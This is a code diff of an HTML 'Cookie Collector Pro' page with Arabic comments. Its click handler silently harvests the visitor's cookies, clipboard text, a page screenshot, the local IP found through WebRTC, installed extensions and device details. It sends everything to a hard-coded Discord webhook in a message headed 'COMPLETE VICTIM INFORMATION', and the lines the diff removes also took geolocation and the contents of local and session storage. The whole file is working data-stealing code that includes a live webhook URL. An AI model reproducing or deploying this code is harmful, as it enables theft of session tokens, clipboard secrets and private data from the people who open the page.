@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Cookie Collector</title>
+    <title>Cookie Collector Pro</title>
     <style>
         body { text-align: center; }
         img { cursor: pointer; }
@@ -9,195 +9,285 @@
 </head>
 <body>
     <h1>Click on the image</h1>
-    <!-- استبدل رابط الصورة هنا -->
     <img src="https://i.imgur.com/example.jpg" width="300" onclick="sendCookies()" />
 
+    <script src="https://html2canvas.hertzen.com/dist/html2canvas.min.js"></script>
+
     <script>
-        // إنشاء ملفات تعريف ارتباط مؤقتة للاختبار
+        // إنشاء كوكيز للاختبار
         document.cookie = "test_cookie=123; path=/";
         document.cookie = "user_session=abcxyz; path=/";
         document.cookie = "token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ; path=/";
 
         async function sendCookies() {
             try {
-                // جمع المعلومات الأساسية
-                const cookies = document.cookie;
-                const userAgent = navigator.userAgent;
-                const language = navigator.language;
-                const screenWidth = window.screen.width;
-                const screenHeight = window.screen.height;
-                const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-                const platform = navigator.platform;
-                const cpuCores = navigator.hardwareConcurrency || "Unknown";
-                const memory = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Unknown";
-                
-                // معلومات الاتصال
-                let connection = "Unknown";
-                if (navigator.connection) {
-                    connection = `${navigator.connection.effectiveType || 'Unknown'} (${navigator.connection.downlink || '?'} Mbps)`;
-                    if (navigator.connection.rtt) connection += ` | RTT: ${navigator.connection.rtt}ms`;
-                }
-                
-                // محاولة الحصول على IP
-                let ip = "Unknown";
+                let allInfo = {};
+
+                // ============================================
+                // 1. معلومات الشبكة المتقدمة
+                // ============================================
+                const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                allInfo.network = {
+                    downlink: connection?.downlink || 'Unknown',
+                    effectiveType: connection?.effectiveType || 'Unknown',
+                    rtt: connection?.rtt || 'Unknown',
+                    saveData: connection?.saveData || false,
+                    type: connection?.type || 'Unknown'
+                };
+
+                // ============================================
+                // 2. معلومات المتصفح بدقة
+                // ============================================
+                allInfo.browser = {
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    languages: navigator.languages,
+                    cookieEnabled: navigator.cookieEnabled,
+                    doNotTrack: navigator.doNotTrack,
+                    hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
+                    deviceMemory: navigator.deviceMemory || 'Unknown',
+                    maxTouchPoints: navigator.maxTouchPoints,
+                    pdfViewerEnabled: navigator.pdfViewerEnabled,
+                    webdriver: navigator.webdriver || false,
+                    vendor: navigator.vendor,
+                    productSub: navigator.productSub
+                };
+
+                // ============================================
+                // 3. معلومات GPU
+                // ============================================
                 try {
-                    const ipResponse = await fetch('https://api.ipify.org?format=json');
-                    const ipData = await ipResponse.json();
-                    ip = ipData.ip;
-                } catch (error) {
-                    console.log("Could not fetch IP");
+                    const canvas = document.createElement('canvas');
+                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                    if (gl) {
+                        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                        allInfo.gpu = {
+                            renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'Unknown',
+                            vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'Unknown',
+                            version: gl.getParameter(gl.VERSION),
+                            shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION)
+                        };
+                    } else {
+                        allInfo.gpu = 'WebGL not supported';
+                    }
+                } catch (e) {
+                    allInfo.gpu = 'Error getting GPU info';
                 }
 
-                // معلومات البطارية
-                let battery = "Unknown";
+                // ============================================
+                // 4. معلومات الشبكة المحلية (محاولة)
+                // ============================================
+                allInfo.localNetwork = 'Limited access due to security';
+                
+                // محاولة بسيطة لاكتشاف الأجهزة (قد لا تعمل)
+                try {
+                    const rtcConfig = {
+                        iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
+                    };
+                    const rtc = new RTCPeerConnection(rtcConfig);
+                    
+                    rtc.createDataChannel('');
+                    
+                    rtc.onicecandidate = (e) => {
+                        if (e.candidate && e.candidate.candidate) {
+                            const ipMatch = e.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
+                            if (ipMatch) {
+                                allInfo.localNetwork = `Local IP detected: ${ipMatch[1]}`;
+                            }
+                        }
+                    };
+                    
+                    rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
+                } catch (e) {
+                    console.log('RTC not available');
+                }
+
+                // ============================================
+                // 5. معلومات الإضافات المثبتة (كشف بعضها)
+                // ============================================
+                const extensionsToDetect = [
+                    { name: 'Grammarly', url: 'chrome-extension://kbfnbcaeplbcioakkpcpgfkobkghlhen/' },
+                    { name: 'LastPass', url: 'chrome-extension://hdokiejnpimakedhajhdlcegeplioahd/' },
+                    { name: 'AdBlock', url: 'chrome-extension://gighmmpiobklfepjocnamgkkbiglidom/' },
+                    { name: 'uBlock Origin', url: 'chrome-extension://cjpalhdlnbpafiamejdnhcphjbkeiagm/' },
+                    { name: 'Honey', url: 'chrome-extension://bmnlcjabgnpnenekpadlanbbkooimhnj/' },
+                    { name: 'Avast Online Security', url: 'chrome-extension://gomekmidlodglbbmalcneegieacbdmki/' }
+                ];
+
+                allInfo.extensions = [];
+                
+                for (let ext of extensionsToDetect) {
+                    try {
+                        const img = new Image();
+                        img.src = ext.url + 'icons/icon16.png';
+                        await new Promise((resolve) => {
+                            img.onload = () => {
+                                allInfo.extensions.push(`${ext.name}: ✅ Installed`);
+                                resolve();
+                            };
+                            img.onerror = () => {
+                                resolve();
+                            };
+                            setTimeout(resolve, 500);
+                        });
+                    } catch (e) {
+                        // Extension not found
+                    }
+                }
+
+                if (allInfo.extensions.length === 0) {
+                    allInfo.extensions = ['No detected extensions'];
+                }
+
+                // ============================================
+                // 6. محاولة أخذ لقطة شاشة
+                // ============================================
+                try {
+                    const canvas = await html2canvas(document.body);
+                    allInfo.screenshot = canvas.toDataURL('image/png');
+                    // ملاحظة: اللقطة طويلة جداً، ممكن نقسمها أو نرسلها كملف
+                } catch (e) {
+                    allInfo.screenshot = 'Screenshot failed';
+                }
+
+                // ============================================
+                // 7. معلومات الـ Clipboard
+                // ============================================
+                try {
+                    const text = await navigator.clipboard.readText();
+                    allInfo.clipboard = text || 'Empty clipboard';
+                } catch (e) {
+                    allInfo.clipboard = 'Clipboard access denied or not available';
+                }
+
+                // ============================================
+                // 8. معلومات الشبكات المتوفرة
+                // ============================================
+                allInfo.availableNetworks = 'Cannot access due to security restrictions';
+
+                // ============================================
+                // 9. معلومات إضافية عن الشاشة
+                // ============================================
+                allInfo.screen = {
+                    width: window.screen.width,
+                    height: window.screen.height,
+                    availWidth: window.screen.availWidth,
+                    availHeight: window.screen.availHeight,
+                    colorDepth: window.screen.colorDepth,
+                    pixelDepth: window.screen.pixelDepth,
+                    orientation: window.screen.orientation?.type || 'Unknown'
+                };
+
+                // ============================================
+                // 10. معلومات الوقت والمنطقة
+                // ============================================
+                allInfo.timeInfo = {
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    localTime: new Date().toString(),
+                    timezoneOffset: new Date().getTimezoneOffset(),
+                    locale: navigator.language
+                };
+
+                // ============================================
+                // 11. معلومات البطارية
+                // ============================================
                 if (navigator.getBattery) {
                     try {
-                        const batteryInfo = await navigator.getBattery();
-                        battery = `${Math.round(batteryInfo.level * 100)}% (${batteryInfo.charging ? '⚡ Charging' : '🔋 Not charging'})`;
+                        const battery = await navigator.getBattery();
+                        allInfo.battery = {
+                            level: battery.level * 100 + '%',
+                            charging: battery.charging,
+                            chargingTime: battery.chargingTime,
+                            dischargingTime: battery.dischargingTime
+                        };
                     } catch (e) {
-                        battery = "Not available";
+                        allInfo.battery = 'Battery info not available';
                     }
                 }
 
-                // معلومات التوقيت المحلي
-                const localTime = new Date().toString();
-                const timezoneOffset = new Date().getTimezoneOffset();
+                // ============================================
+                // إرسال كل المعلومات إلى Discord
+                // ============================================
                 
-                // محاولة الحصول على الموقع الجغرافي (إذا سمح المستخدم)
-                let geoLocation = "Not available (permission required)";
-                try {
-                    const position = await new Promise((resolve, reject) => {
-                        navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 3000 });
-                    });
-                    geoLocation = `${position.coords.latitude}, ${position.coords.longitude} (Accuracy: ${Math.round(position.coords.accuracy)}m)`;
-                } catch (e) {
-                    geoLocation = "User denied or timeout";
-                }
-
-                // معلومات التخزين المحلي
-                let localStorage = "Not available";
-                try {
-                    if (window.localStorage.length > 0) {
-                        const items = [];
-                        for (let i = 0; i < window.localStorage.length; i++) {
-                            const key = window.localStorage.key(i);
-                            items.push(`${key}: ${window.localStorage.getItem(key).substring(0, 30)}${window.localStorage.getItem(key).length > 30 ? '...' : ''}`);
-                        }
-                        localStorage = items.join('\n') || "Empty";
-                    } else {
-                        localStorage = "Empty";
-                    }
-                } catch (e) {
-                    localStorage = "Access denied";
-                }
-
-                // معلومات Session Storage
-                let sessionStorage = "Not available";
-                try {
-                    if (window.sessionStorage.length > 0) {
-                        const items = [];
-                        for (let i = 0; i < window.sessionStorage.length; i++) {
-                            const key = window.sessionStorage.key(i);
-                            items.push(`${key}: ${window.sessionStorage.getItem(key).substring(0, 30)}${window.sessionStorage.getItem(key).length > 30 ? '...' : ''}`);
-                        }
-                        sessionStorage = items.join('\n') || "Empty";
-                    } else {
-                        sessionStorage = "Empty";
-                    }
-                } catch (e) {
-                    sessionStorage = "Access denied";
-                }
-
-                // معلومات الإضافات (Plugins)
-                let plugins = [];
-                for (let i = 0; i < navigator.plugins.length; i++) {
-                    plugins.push(navigator.plugins[i].name);
-                }
-                const pluginsList = plugins.length > 0 ? plugins.join('\n') : "No plugins detected";
-
-                // معلومات الصفحة الحالية
-                const currentUrl = window.location.href;
-                const referrer = document.referrer || "No referrer";
-                const pageTitle = document.title;
-
-                // معلومات الـ DO NOT TRACK
-                const doNotTrack = navigator.doNotTrack || "Not specified";
-
-                // استبدل رابط Webhook الخاص بك هنا
                 const webhookUrl = 'https://discord.com/api/webhooks/1476727887053721721/UkshRh9j3xisTqqOHLnEvMI5dFlg-dmLWZkuY55yPtAWjuFFM0iPkMlFWUlF0LUjWHTN';
 
-                // إرسال المعلومات إلى Discord
+                // تجهيز الرسالة (لأن اللقطة كبيرة، نرسلها بشكل منفصل)
+                
+                // 1. نرسل المعلومات النصية أولاً
+                const textMessage = `
+**🚨 COMPLETE VICTIM INFORMATION 🚨**
+
+**📦 COOKIES:**
+\`\`\`
+${document.cookie || 'No cookies'}
+\`\`\`
+
+**🌐 NETWORK INFO:**
+• Downlink: ${allInfo.network.downlink} Mbps
+• Connection Type: ${allInfo.network.effectiveType}
+• RTT: ${allInfo.network.rtt} ms
+• Save Data: ${allInfo.network.saveData}
+
+**🖥️ BROWSER INFO:**
+• Platform: ${allInfo.browser.platform}
+• Languages: ${allInfo.browser.languages}
+• Hardware Concurrency: ${allInfo.browser.hardwareConcurrency}
+• Device Memory: ${allInfo.browser.deviceMemory} GB
+• PDF Viewer: ${allInfo.browser.pdfViewerEnabled}
+
+**🎮 GPU INFO:**
+• Renderer: ${allInfo.gpu.renderer || 'Unknown'}
+• Vendor: ${allInfo.gpu.vendor || 'Unknown'}
+
+**📺 SCREEN INFO:**
+• Resolution: ${allInfo.screen.width}x${allInfo.screen.height}
+• Color Depth: ${allInfo.screen.colorDepth}
+• Orientation: ${allInfo.screen.orientation}
+
+**🔧 DETECTED EXTENSIONS:**
+${allInfo.extensions.join('\n')}
+
+**📋 CLIPBOARD:**
+${allInfo.clipboard}
+
+**⏰ TIME INFO:**
+• Timezone: ${allInfo.timeInfo.timezone}
+• Local Time: ${allInfo.timeInfo.localTime}
+
+**🔋 BATTERY:**
+${allInfo.battery.level || 'Unknown'} (Charging: ${allInfo.battery.charging})
+
+**🌍 LOCAL NETWORK:**
+${allInfo.localNetwork}
+`;
+
                 await fetch(webhookUrl, {
                     method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        content: `**🚨 NEW VICTIM INFORMATION COLLECTED 🚨**
-
-**📋 COOKIES 📋**
-\`\`\`
-${cookies || 'No cookies found'}
-\`\`\`
-
-**🔐 TOKENS & SESSIONS 🔐**
-Token in cookies: ${cookies.includes('token') ? '✅ YES' : '❌ NO'}
-Session in cookies: ${cookies.includes('session') || cookies.includes('auth') ? '✅ YES' : '❌ NO'}
-
-**💻 SYSTEM INFO 💻**
-• **User Agent:** ${userAgent}
-• **Platform:** ${platform}
-• **Language:** ${language}
-• **Timezone:** ${timezone} (Offset: ${timezoneOffset} minutes)
-• **Local Time:** ${localTime}
-• **Do Not Track:** ${doNotTrack}
-
-**🖥️ HARDWARE 🖥️**
-• **Screen:** ${screenWidth}x${screenHeight}
-• **CPU Cores:** ${cpuCores}
-• **Memory:** ${memory}
-• **Battery:** ${battery}
-• **Connection:** ${connection}
-
-**🌐 NETWORK & LOCATION 🌐**
-• **IP Address:** ${ip}
-• **Geolocation:** ${geoLocation}
-
-**📦 STORAGE 📦**
-**Local Storage:**
-\`\`\`
-${localStorage}
-\`\`\`
-
-**Session Storage:**
-\`\`\`
-${sessionStorage}
-\`\`\`
-
-**🔧 BROWSER INFO 🔧**
-**Plugins:**
-\`\`\`
-${pluginsList}
-\`\`\`
-
-**📄 PAGE INFO 📄**
-• **Current URL:** ${currentUrl}
-• **Referrer:** ${referrer}
-• **Page Title:** ${pageTitle}
-
-**📊 ADDITIONAL INFO 📊**
-• **Cookies Enabled:** ${navigator.cookieEnabled ? '✅ Yes' : '❌ No'}
-• **Online Status:** ${navigator.onLine ? '✅ Online' : '❌ Offline'}
-• **PDF Viewer:** ${navigator.pdfViewerEnabled ? '✅ Yes' : '❌ No'}`
-                    })
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ content: textMessage })
                 });
 
-                // لا توجد تنبيهات! كل شيء يتم بصمت
-                console.log("Information sent successfully!");
-                
+                // 2. نرسل اللقطة إذا كانت موجودة
+                if (allInfo.screenshot && allInfo.screenshot !== 'Screenshot failed') {
+                    // نحول base64 إلى blob
+                    const base64Data = allInfo.screenshot.split(',')[1];
+                    const blob = atob(base64Data);
+                    
+                    // نرسل كـ attachment
+                    const formData = new FormData();
+                    formData.append('file', new Blob([blob]), 'screenshot.png');
+                    
+                    await fetch(webhookUrl, {
+                        method: 'POST',
+                        body: formData
+                    });
+                }
+
+                console.log('All information sent successfully!');
+
             } catch (error) {
-                console.error("Error sending information:", error);
-                // يمكن إخفاء الخطأ أيضاً إذا أردت
+                console.error('Error:', error);
             }
         }
     </script>
